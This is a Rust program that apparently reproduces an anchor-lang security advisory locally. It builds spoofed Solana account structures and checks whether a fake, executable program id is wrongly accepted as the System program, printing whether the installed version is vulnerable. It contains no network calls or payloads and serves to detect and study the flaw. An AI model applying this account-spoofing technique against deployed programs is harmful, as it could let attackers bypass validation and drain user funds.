//! Host-side reproduction of GHSA-c6rc-8jpp-2fgc / CVE-2026-45137 / RUSTSEC-2026-0144.
//!
//! Builds against ONE anchor-lang version at a time (set by run.sh, which patches
//! Cargo.toml). It constructs an AccountInfo whose key is an attacker-controlled,
//! *executable* program id (NOT the system program) and asks
//! `TryFrom<&AccountInfo> for Program<'_, System>` to validate it.
//!
//! Read-only: no chain access, no transactions.
use anchor_lang::accounts::program::Program;
use anchor_lang::solana_program::account_info::AccountInfo;
use anchor_lang::solana_program::pubkey::Pubkey;
use anchor_lang::system_program::System;

fn main() {
    let fake_key = Pubkey::new_from_array([7u8; 32]); // NOT the system program
    let system_key = Pubkey::default(); // System::id() == Pubkey::default()
    let owner = Pubkey::default();

    let mut lamports = 0u64;
    let mut data: [u8; 0] = [];
    let info = AccountInfo::new(&fake_key, false, false, &mut lamports, &mut data, &owner, true);
    let fake_accepted = Program::<System>::try_from(&info).is_ok();
    let fake_err = Program::<System>::try_from(&info).err().map(|e| format!("{e}"));

    let mut lamports2 = 0u64;
    let mut data2: [u8; 0] = [];
    let sysinfo = AccountInfo::new(&system_key, false, false, &mut lamports2, &mut data2, &owner, true);
    let system_accepted = Program::<System>::try_from(&sysinfo).is_ok();

    let mut lamports3 = 0u64;
    let mut data3: [u8; 0] = [];
    let noexec = AccountInfo::new(&fake_key, false, false, &mut lamports3, &mut data3, &owner, false);
    let nonexec_accepted = Program::<System>::try_from(&noexec).is_ok();

    let verdict = if fake_accepted { "VULNERABLE" } else { "patched" };
    println!(
        "RESULT version={} fake_system_accepted={} real_system_accepted={} nonexec_accepted={} verdict={}",
        env!("CARGO_PKG_VERSION"),
        fake_accepted,
        system_accepted,
        nonexec_accepted,
        verdict
    );
    println!("  rejection error for fake system program: {:?}", fake_err);
}
